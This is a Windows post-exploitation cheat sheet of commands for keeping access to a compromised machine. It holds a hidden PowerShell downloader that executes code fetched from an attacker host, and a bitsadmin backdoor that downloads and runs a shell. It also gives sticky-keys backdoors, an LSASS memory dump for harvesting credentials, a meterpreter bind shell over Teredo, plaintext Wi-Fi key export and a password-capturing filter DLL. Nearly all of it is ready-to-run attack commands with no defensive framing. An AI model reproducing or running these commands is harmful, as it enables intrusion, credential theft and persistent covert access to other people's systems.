<!-- Code for collapse and expand -->
<script type="text/javascript">
$(document).ready(function() {
$('div.view').hide();
$('div.slide').click(function() {
$(this).next('div.view').slideToggle('fast');
return false;
});
});
</script>

# Windows General Persistence Commands

Commands to run to maintain persistence after you have exploited it and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.

### Firewall Exceptions
When you modify a system to talk on the network, you may need to alter the Windows firewall so your traffic is not filtered. The `netsh` command can be used to do this as the command to enable Remote Desktop Protocol below shows:

`netsh firewall set service type = remotedesktop mode = enable`

### Allow a program to listen through the firewall
Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html

`netsh firewall add allowedprogram C:\nltest.exe mltest enable`

### Open a port on the firewall
Taken from http://synjunkie.blogspot.de/2008/03/basic-dos-foo.html

`netsh firewall add portopening tcp 2482 lt enable all`


### Tunnel Traffic Natively with Windows
`netsh int portproxy v4tov4 listenport=80 connecthost=[AttackerIP] connectport=80`


### Powershell Downloader
 * **Command with arguments**: `powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file]'))"`
 * **Description**: According to [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), _"Schedule this and it will execute the shellcode on that page, pulling it each time (so you can change as needed)"_.

### bitsadmin Download/Exec
Make the backdoor:
```
bitsadmin /create backdoor
bitsadmin /addfile backdoor http://192.168.20.10/theshell.exe C:\windows\temp\theshell.exe
bitsadmin /SETMINRETRYDELAY 88000
bitsadmin /SETNOTIFYCMDLINE backdoor C:\windows\temp\theshell.exe NULL
```

Check the backdoor is set up correctly:
```
bitsadmin /getnotifycmdline backdoor
bitsadmin /listfiles backdoor
```

Run the backdoor:
```
bitsadmin /RESUME backdoor
```

### Remote Assistance Enable
 * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f`
 * **Description**: **Must be admin to run this.** Enable remote assistance through adding a registry entry on the local system.


### Remote Desktop Enable - Method 1
 * **Command with arguments**: `reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f`
 * **Description**: **Must be admin to run this.** Enable remote desktop through adding a registry entry on the local system.


### Remote Desktop Enable - Method 2
Remote Desktop allows a remote user to receive a graphical "desktop" of the target (compromised) system. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 53)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely enable remote desktop using the commands below.

 1. On the compromised system, create a file named `fix_ts_policy.ini` containing the contents below. Change the *"hacked_account"* value to the account you have compromised on the remote system.


    <pre>
     [Unicode]
         Unicode=yes
         [Version]
         signature="$CHICAGO$"
         Revision=1
         [Privilege Rights] [Privilege Rights]
         seremoteinteractivelogonright = hacked_account
         seinteractivelogonright = hacked_account
         sedenyinteractivelogonright =
         sedenyremoteinteractivelogonright =
         sedenynetworklogonright =
    </pre>

 1. Create another file named `enable_ts.reg` containing the contents below.



    <pre>

     Windows Registry Editor Version 5.00

     [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]

     "fDenyTSConnections"=dword:00000000

     "TSEnabled"=dword:00000001

     "TSUserEnabled"=dword:00000000

    </pre>



 1. On the remote system, execute the following commands:


```
c:\> sc config termservice start= auto sc config termservice start= auto

c:\> regedit /s enable_ts.reg

c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\new.secedit.sdb

c:\> copy c:\windows\security\database\secedit.sdb c:\windows\security\database\orig.secedit.sdb

c:\> secedit /configure /db new.secedit.sdb /cfg fix_ts_policy.ini

c:\> gpupdate /Force

c:\> net start "terminal services"
```





### Scheduler

The [Windows scheduler](http://support.microsoft.com/kb/313565) can be used to further compromise a system. It usually runs at the SYSTEM account privilege level. According to Val Smith's and Colin Ames' [BlackHat 2008 presentation (page 58)](http://www.blackhat.com/presentations/bh-usa-08/Smith_Ames/BH_US_08_Smith_Ames_Meta-Post_Exploitation.pdf), you can remotely schedule tasks using the commands below.



<pre>

c:\> net use \\[TargetIP]\ipc$ password /user:username

c:\> at \\[TargetIP] 12:00 pm command

</pre>



An example you might run on the remote system might be: `at \\192.168.1.1 12:00pm tftp -I [MyIP] GET nc.exe`


### Scheduling tasks to run under special conditions

One can schedule tasks to run under certain conditions such as when a user logs into the computer or when the computer is idle
with the schtasks command. This can be done by any user and includes the following additional conditions which can come in handy:

* ONIDLE -> Run a command once the system enters an idle state
* ONLOGON -> Run a command when a user logs into the system
* ONSTART -> Run a command when the system starts up
 
If you would like more information on the various command line options for this tool, Microsoft describes them in great
detail at: [https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create](https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create)



### Sticky Keys (Requires reboot)

Sticky keys on Windows systems are activated when the user presses the SHIFT key 5 times. Here, according to the [posted slides](http://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607), you replace the sethc.exe binary with your own binary (cmd.exe maybe?) and, when SHIFT is pressed 5 times, your binary is executed. Your binary will execute as SYSTEM and needs to replace the `%WINDIR%\System32\sethc.exe`.



Some caveats:

* If NLA (Network Layer Authentication) is enabled, this won't work

* If RDP (Remote Desktop Protocol) is disabled, this won't work





### Sticky Keys (No reboot)

This technique uses registry entries to switch the binary that the sticky keys executes. Its real advantage is that it does not require a reboot for the switch to take place.

* In the `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` make a key called `sethc.exe`

* Make a REG_SZ value called "Debugger" (Ensure it is capitalized)

* For the "Debugger" REG_SZ, make it have a value of your binary

* Press SHIFT 5 times and your binary should be executed

### Process Dumping For Passwords
If you have access to a server and one of the user's usernames and passwords and can create shares on that computer,
you may be able to create a scheduled task which runs procdump.exe to dump all of the memory of the lsass process,
thus gaining access to all of the stored credentials on the targeted computer:

```
net use \\target server /user:DOM\username password
copy procdump.exe \\targetserver\c$
copy procdump.bat \\targetserver\c$
procdump.exe -ma lsass creds.dump
at \\targetserver 13:37 C:\procdump.bat
copy \\targetserver\c$\targetserver.dmp .
```

### Teredo IPv6 Bindshell
Creating a teredo tunnel to allow a remote victim to tunnel IPv6 packets over IPv4 may allow you to evade some
filter detection systems and extract information from a victim without triggering alerts on the target network.

In order to do this one needs to use a teredo server which will convert IPv4 packets to IPv6 packets and vice versa.
Several publicly available servers are available including:

* teredo.trex.fi
* teredo.remlab.net
* teredo-debian.remlab.net
* teredo.ngix.ne.kr
* win8.ipv6.microsoft.com (This may be shaky on Windows 7, so don't rely on it)

To set up a tunnel, issue the following commands:

```
netsh interface ipv6 install
netsh interface ipv6 teredo enterpriseclient
netsh interface ipv6 teredo set client teredo.trex.fi
msfpayload windows/meterpreter/bind_ipv6_tcp LPORT=5555 X > bind.exe
```

All we have to do at this point is upload the resulting bind.exe payload to the victim, execute it, and then set up
metasploit to connect to the public IPv6 address that the victim was assigned on the specified port (5555 in this example), and we should now be able to get a meterpreter shell using teredo tunneling :)

Further details are available at [http://www.room362.com/blog/2010/09/24/revenge-of-the-bind-shell/](http://www.room362.com/blog/2010/09/24/revenge-of-the-bind-shell/)

### Export Local Wireless Passwords (In Plaintext)
```
netsh wlan export profile key=clear
```

### Capture Password Changes With Password Filters
To do this one simply needs to take the following steps:
* Create a password filtering DLL (see Didler Steven's example password filterer DLL at [http://blog.didierstevens.com/2010/11/15/password-auditing-with-a-password-filter/](http://blog.didierstevens.com/2010/11/15/password-auditing-with-a-password-filter/) if you want an example of some code you can modify to do this)
* Dump the resulting DLL into %WINDIR%\System32\
* Change HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages and add in the location of your DLL as it's value. If the key does not exist, create it first, then set the location as it's value DO NOT ADD IN THE .DLL EXTENSION. (Further details on this stage of the process are detailed at [https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766%28v=vs.85%29.aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms721766%28v=vs.85%29.aspx))
* Reboot the system and wait for passwords to be logged according to the actions defined within your DLL as people change them.
* 
* 

Details on how this works are included in Microsoft's documentation at [https://msdn.microsoft.com/en-us/library/windows/desktop/ms721882%28v=vs.85%29.aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms721882%28v=vs.85%29.aspx)
